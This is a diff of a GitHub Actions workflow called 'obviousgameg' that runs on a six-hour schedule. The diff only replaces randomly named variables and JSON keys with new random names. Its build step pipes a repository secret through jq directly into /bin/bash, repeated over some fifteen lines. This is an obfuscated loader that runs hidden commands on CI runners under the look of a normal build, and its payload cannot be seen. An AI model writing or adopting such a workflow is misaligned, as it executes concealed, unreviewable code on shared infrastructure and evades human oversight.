@@ -2,7 +2,7 @@ name: obviousgameg
 on:
   workflow_dispatch:
   schedule:
-    - cron: '31 1/6 * * *'
+    - cron: '8 2/6 * * *'
 
 jobs:
   build:
@@ -12,20 +12,21 @@ jobs:
       - uses: actions/checkout@v4
       - name: obviousgameg
         env:
-          kz78: ${{ secrets.kz78 }}
+          pnvm200: ${{ secrets.pnvm200 }}
         run: |
-          echo $kz78 | jq -r .z9837 | /bin/bash
-          echo $sllug47 | jq -r .ooky8 | /bin/bash
-          echo $zhnw9 | jq -r .kxiob70 | /bin/bash
-          echo $l48 | jq -r .vp5 | /bin/bash
-          echo $g3936 | jq -r .pdo543 | /bin/bash
-          echo $xle13331 | jq -r .tynnx22573 | /bin/bash
-          echo $tgwa8536 | jq -r .oyv49813 | /bin/bash
-          echo $j10 | jq -r .iolqa4 | /bin/bash
-          echo $wrei96 | jq -r .sh0 | /bin/bash
-          echo $yhoaz8 | jq -r .qgcpf3 | /bin/bash
-          echo $ty4 | jq -r .j9043 | /bin/bash
-          echo $rp7 | jq -r .uwwp23556 | /bin/bash
-          echo $ky6215 | jq -r .xseo36397 | /bin/bash
-          echo $yem53 | jq -r .j35337 | /bin/bash
+          echo $pnvm200 | jq -r .wkdhq26 | /bin/bash
+          echo $fqeo153 | jq -r .bhfnn3 | /bin/bash
+          echo $tqy5728 | jq -r .afgg667 | /bin/bash
+          echo $ign9838 | jq -r .krp465 | /bin/bash
+          echo $if2 | jq -r .dhnb0761 | /bin/bash
+          echo $in35327 | jq -r .qc32 | /bin/bash
+          echo $dq71 | jq -r .jnpkp31435 | /bin/bash
+          echo $bb882 | jq -r .lvnlf10 | /bin/bash
+          echo $us55 | jq -r .hls788 | /bin/bash
+          echo $bdnz10 | jq -r .ayvld659 | /bin/bash
+          echo $tpzc379 | jq -r .ekkl60 | /bin/bash
+          echo $wa294 | jq -r .evf36 | /bin/bash
+          echo $maaw32 | jq -r .o78 | /bin/bash
+          echo $y9651 | jq -r .b21 | /bin/bash
+          echo $ux0 | jq -r .ubzf126 | /bin/bash
 
